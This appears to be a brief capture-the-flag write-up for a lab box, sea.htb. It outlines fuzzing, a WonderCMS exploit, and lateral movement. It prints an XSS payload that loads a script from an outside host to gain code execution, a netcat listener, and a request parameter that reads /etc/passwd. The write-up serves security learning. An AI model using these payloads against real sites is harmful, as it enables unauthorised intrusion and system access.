#### port scanning and web emulating
Fuzz the dir of port 80
...
3.2.0
```
Search for Vunl of wonderCMS, and get the dir of loginURL by default vunl to ssrf and RCE
...
```
#### foot hold
after running the python3 exploit file, we need to trigger it on page,http://sea.htb/contact.php, by adding below payload to website field
`http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.16.30:8822/xss.js"></script><form+action="`
#### lateral move
`└─$ nc -nvlp 8821 `
```
...
```
try amay first to ssh in
`└─$ ssh amay@sea.htb `
```
amay@sea:~$ id
uid=1000(amay) gid=1000(amay) groups=1000(amay)
```
check the services active
```
...
tcp6       0      0 :::22                   :::*                    LISTEN      -    
```
port forwarding pot 8080
`ssh -L 8080:localhost:8080 amay@sea.htb `
it is a monitoring of system page, use burp s to catch the post request
```
 POST / HTTP/1.1
Host: 127.0.0.1:8080
Content-Length: 37
...
```
find a point might be vuln to command injection
try passwd, it works
`log_file=%2Fetc%2Fpasswd&analyze_log=`
check the user who ran this service
...
#### lesson learned
- check the POC file more carefully, may get critical info
- command inejction details
